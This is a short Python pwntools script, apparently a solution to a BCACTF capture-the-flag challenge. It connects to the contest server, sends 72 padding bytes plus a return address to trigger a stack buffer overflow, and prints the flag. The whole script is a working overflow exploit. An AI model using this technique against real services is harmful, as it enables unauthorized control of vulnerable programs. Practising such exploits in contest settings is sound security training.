from pwn import *
host = "bin.bcactf.com"
port = 49158
p = remote(host, port)
(p.recvuntil(b"wonderful number?"))
payload = "A"*72+'\x56\x12\x40\x00\x00\x00'
p.sendline(payload)
print(p.recvuntil("bcactf{")[-7:]+p.recvuntil("}"))
